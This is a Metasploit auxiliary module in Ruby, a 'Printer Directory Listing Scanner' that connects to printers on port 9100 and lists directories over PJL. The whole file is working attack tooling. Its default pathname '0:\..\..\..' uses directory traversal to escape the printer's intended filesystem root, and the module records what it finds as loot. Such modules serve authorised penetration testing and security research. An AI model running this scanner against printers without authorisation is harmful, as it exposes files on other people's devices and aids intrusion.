##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require "msf/core"
require "rex/proto/pjl"

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name' => "Printer Directory Listing Scanner",
      'Description' => %q{
        This module lists a directory on a printer using PJL.
      },
      'Author' => [
        "wvu", # This implementation
        "MC", # Independent implementation
        "YGN" # Independent implementation
      ],
      'References' => [
        ["URL", "https://en.wikipedia.org/wiki/Printer_Job_Language"]
      ],
      'License' => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(9100),
      OptString.new("PATHNAME", [true, "Pathname", '0:\..\..\..'])
    ], self.class)
  end

  def run_host(ip)
    connect
    pjl = Rex::Proto::PJL::Client.new(sock)
    pjl.begin_job
    pathname = datastore["PATHNAME"]
    pjl.fsinit(pathname[0..1])
    listing = pjl.fsdirlist(pathname)
    pjl.end_job
    disconnect

    if listing
      print_good("#{ip}\n#{listing}")
      report_note({
        :host => ip,
        :port => rport,
        :proto => "tcp",
        :type => "printer.dir.listing",
        :data => listing
      })
    end
  end

end
